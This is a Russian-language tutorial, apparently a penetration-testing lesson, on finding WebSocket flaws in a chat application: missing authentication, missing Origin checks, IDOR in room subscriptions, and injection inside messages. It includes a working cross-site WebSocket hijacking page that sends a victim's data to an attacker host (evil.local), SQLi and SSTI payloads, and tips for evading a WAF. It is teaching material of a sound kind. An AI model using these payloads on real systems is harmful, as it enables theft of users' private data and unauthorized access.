## Вопрос, с которого всё начинается

В чате на сайте сообщения появляются мгновенно, без перезагрузки. Это работает **WebSocket** — протокол, который открывает постоянный двунаправленный канал между браузером и сервером.

И тут кроется важная для тебя деталь. Обычный HTTP-запрос «бесплатно» защищён инфраструктурой: прокси проверяет аутентификацию, WAF фильтрует параметры, фреймворк навязывает CSRF-токены. А WebSocket после открытия — это сырой поток фреймов, и всё это приложение должно реализовать **само**. Обычно оно забывает. Сегодня найдём эти забытые проверки в чате.

## Наш пример: чат по WebSocket

Соединение начинается как обычный HTTP-запрос с заголовком `Upgrade`:

```http
GET /ws HTTP/1.1
Host: t
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://t
```

Сервер отвечает `101 Switching Protocols`, и дальше данные идут фреймами. Для безопасности важны три вещи: браузер сам шлёт **`Origin`**, при рукопожатии отправляются **cookie** (значит, возможен CSRF), а **аутентификацию** сервер должен проверить сам.

## Шаг 1: есть ли вообще аутентификация

Первый тест — подключиться вообще без cookie:

```bash
$ websocat ws://t/ws
{"type":"welcome","user":"guest"}
```

Если соединение открылось и сервер принимает сообщения — аутентификации нет. Проверим, какие действия он готов выполнять:

```bash
$ websocat ws://t/ws <<< '{"action":"getMessages"}'
{"type":"history","messages":[...]}
```

`websocat` — консольный клиент WebSocket (аналог `curl` для `ws://`). Через него видно, что по WS доступны действия, которые через HTTP, возможно, защищены.

## Шаг 2: проверяет ли сервер Origin

Браузер отправляет cookie при рукопожатии, а WebSocket **не подчиняется** Same-Origin Policy так строго, как `fetch`. Если сервер не проверяет `Origin`, страница атакующего откроет соединение от имени жертвы. Проверяем, отвергает ли сервер чужой origin:

```bash
$ websocat ws://t/ws -H='Origin: https://evil.com'
{"type":"welcome","user":"guest"}
```

Соединение открылось с чужим `Origin` — проверки нет. Значит, возможна атака **CSWSH** (cross-site WebSocket hijacking). Собираем страницу-эксплойт, которая подключается от лица жертвы и выносит данные:

```html
<script>
const ws = new WebSocket('wss://t/ws');
ws.onmessage = e => fetch('https://evil.local/?d=' + encodeURIComponent(e.data));
ws.onopen = () => ws.send('{"action":"getPrivateData"}');
</script>
```

Жертва открывает страницу — её приватные сообщения уходят на сервер атакующего. Артефакт — чужие данные в твоём логе.

## Шаг 3: IDOR в подписке

Даже если Origin проверяется, действия внутри канала могут не проверять права. Подпишемся на свою комнату, а затем — на чужую:

```bash
$ websocat ws://t/ws -H='Cookie: session=abc' <<< '{"action":"subscribe","room":"user-57"}'
{"type":"history","messages":[...]}
$ websocat ws://t/ws -H='Cookie: session=abc' <<< '{"action":"subscribe","room":"admin"}'
{"type":"history","messages":[...]}   # чужие данные -> IDOR
```

Это **IDOR по WebSocket**: `room` — идентификатор объекта, и сервер не проверил, что комната принадлежит тебе. Главное правило: авторизация нужна на **каждом** действии, а не только при подключении.

## Шаг 4: инъекции в сообщениях

Данные из WS-сообщений уходят в те же sink'и, что и HTTP-параметры: базу, шаблоны, команды. WAF часто не инспектирует содержимое фреймов, поэтому payload'ы проходят там, где HTTP-запрос был бы заблокирован:

```bash
$ websocat ws://t/ws <<< '{"action":"search","q":"1 AND SLEEP(5)-- -"}'
$ websocat ws://t/ws <<< '{"action":"render","tpl":"{{7*7}}"}'
```

Проверяй SQLi, NoSQLi, SSTI, command injection и path traversal так же, как в HTTP, — просто отправляя их в поле сообщения.

## Если не сработало

- Соединение требует токен — попробуй передать его в URL (`ws://t/ws?token=...`) и посмотри, утекает ли он в логи; проверь также `Sec-WebSocket-Protocol`.
- Origin проверяется, но есть **расхождение** между прокси и бэкендом: один проверяет, другой нет. Сравни поведение напрямую и через прокси.
- Данные не выводятся обратно — используй слепой канал: заметь изменение состояния (созданный объект) или timing.
- Компрессия/фрагментация фреймов скрывает payload от WAF — попробуй разбить сообщение на части.

## Сводка уязвимостей WS

| Уязвимость | Признак | Проверка |
|-----------|---------|----------|
| нет auth | соединение без cookie | `websocat ws://t/ws` |
| нет проверки Origin | чужой Origin принят | `-H='Origin: evil.com'` |
| CSRF/hijacking | cookie + нет Origin | страница-эксплойт |
| IDOR | чужой `room`/`user_id` | подписка на чужое |
| инъекция | payload в сообщении | SQLi/SSTI в `send` |
| токен в URL | `?token=` | утечка в логи |

## Почему WebSocket сложнее защищать

Три причины, по которым WS остаётся слепой зоной.

Во-первых, **инфраструктура не помогает**. Middleware, проверявший HTTP-запросы, часто не видит WS-сообщения; WAF, фильтровавший `?id=1'`, не разбирает JSON внутри фрейма. Всё, что HTTP получал «бесплатно», в WS нужно писать руками.

Во-вторых, **асинхронность**. HTTP-запрос — это «запрос-ответ», и проверить права легко. WS — долгоживущий канал, где клиент шлёт десятки разных действий, и каждое требует отдельной проверки. Разработчики часто проверяют права только при подключении — отсюда IDOR внутри сообщений.

В-третьих, **состояние**. Соединение хранит подписки, комнаты, буферы, и ошибки в управлении состоянием приводят к утечкам: подписка на чужую комнату, доступ к чужому буферу, гонки между сообщениями.

## Как найти WS-эндпоинты

Инвентаризация — первый шаг. Ищем `new WebSocket` в JavaScript и адреса в трафике:

```bash
$ katana -u https://t -jc -silent | grep -E '\.js' | sort -u | while read u; do
>   curl -s "$u" | grep -oE "(ws|wss)://[^\"']+" ; done | sort -u
wss://t/ws
wss://t/notifications
```

Затем перебираем действия и фиксируем каждое командой и результатом:

```bash
$ for a in getMessages deleteAccount subscribe setRole getUsers; do
>   echo "== $a"; websocat -t ws://t/ws -H='Cookie: session=abc' <<< "{\"action\":\"$a\"}"; done
```

Так собирается карта действий — и это уже наполовину готовый PoC.

## Что мы теперь знаем

- WebSocket — постоянный двунаправленный канал; после рукопожатия приложение само отвечает за защиту.
- Cookie уходят при рукопожатии → возможен CSRF, если не проверяется `Origin`.
- CSWSH: чужой сайт открывает WS от имени жертвы и читает данные.
- Авторизация нужна на **каждом** действии (IDOR по `room`/`user_id`).
- Инъекции в сообщениях работают так же, как в HTTP, и часто минуют WAF.
- `websocat`/Burp — основные инструменты ручной работы с WS.

## На что смотреть дальше

- Не проверяй только рукопожатие — основная поверхность в сообщениях (действиях).
- Не тестируй WS только из браузера — прямой клиент обходит ограничения и показывает серверную логику.
- Помни про CSRF: cookie + отсутствие проверки `Origin` = CSWSH.
- Ищи токены в URL (`?token=`) — они утекают в логи и referrer.
- Не забывай, что rate-limiting для WS часто отсутствует.

## Куда дальше

В следующем уроке мы посмотрим, как WebSocket используют для **контрабанды** запросов — WebSocket smuggling, когда прокси и бэкенд по-разному видят соединение. А пока главное запомни: WebSocket — это не «ещё один HTTP», а отдельный протокол со своей моделью угроз, и защиту (Origin, авторизация каждого действия, валидация) нужно реализовывать явно.
